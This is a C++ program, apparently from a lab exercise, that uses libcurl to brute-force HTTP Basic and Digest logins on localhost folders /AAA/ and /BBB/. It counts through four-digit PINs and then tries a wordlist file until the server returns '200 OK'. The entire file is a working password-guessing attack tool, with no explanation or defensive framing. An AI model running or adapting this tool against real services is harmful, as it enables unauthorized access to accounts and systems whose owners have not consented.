#include <iostream>
#include <curl/curl.h>
#include <vector>
#include <fstream>
#include <string>

size_t function(char *pointer, size_t size, size_t count, std::string* userdata){
	if(userdata){
		userdata->append(pointer, size*count);
		return size*count;
	}
	else{
		return 0;
	}
}
std::string pass_find(std::string last_pass) {
	int pass = std::stoi(last_pass);
	pass++;
	last_pass.clear();
	if(pass < 10){
		last_pass = last_pass + "000" + std::to_string(pass);
	}
	else if(pass < 100){
		last_pass = last_pass + "00" + std::to_string(pass);
	}
	else if(pass < 1000){
		last_pass = last_pass + "0" + std::to_string(pass);
	}
	else{
		last_pass = last_pass + std::to_string(pass);
	}
	return last_pass;
}

void Check(CURL *curl, std::string &test){
	std::string password = "0000";
	while(1){
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
		curl_easy_perform(curl);
		if(test.find("200 OK") == std::string::npos){
			password = pass_find(password);
			test.clear();
		}
		else{
			std::cout << "Pass = " << password << std::endl;
			std::cout << test;
			break;
		}
	}
	test.clear();
}
void Check_dir(CURL *curl, std::string &test, std::vector<std::string> dictionary){
	for(int i = 0; i < dictionary.size(); i++){
		curl_easy_setopt(curl, CURLOPT_PASSWORD, dictionary[i].c_str());
		curl_easy_perform(curl);
		if(test.find("200 OK") == std::string::npos){
			test.clear();
		}
		else{
			std::cout << "Search Pass is " << i << " variant = " << dictionary[i].c_str() << std::endl;
			std::cout << test;
			break;
		}
	}
	test.clear();
}
int main(){
	std::vector<std::string> dic;

	std::ifstream file("digits.txt");
	std::string temp;
	while(!file.eof()){
		std::getline(file, temp);
		if(temp.length() != 0){
			temp.pop_back();
		}
		dic.push_back(temp);
		temp.clear();
	}

	CURL *curl;

	curl = curl_easy_init();
	if(curl){
		std::string test;
		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost");
		curl_easy_setopt(curl, CURLOPT_HEADER, 1);
		CURLcode res = curl_easy_perform(curl);

		if(res != CURLE_OK){
			std::cout << std::endl << "Errors id: " << res << std::endl;
		}
		else{
			curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/AAA/");
			curl_easy_setopt(curl, CURLOPT_USERNAME, "aaa");
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &test);
			curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);


			std::cout << "AAA folder" << std::endl;
			Check(curl, test);
			std::cout << "\n\n\n";
			Check_dir(curl, test, dic);
			std::cout << "BBB folder" << std::endl;
			curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/BBB/");
			curl_easy_setopt(curl, CURLOPT_USERNAME, "ubbb");
			curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_DIGEST_IE);

			Check(curl, test);
			std::cout << "\n\n\n";
			Check_dir(curl, test, dic);
		}
		curl_easy_cleanup(curl);
	}

	return 0;
}
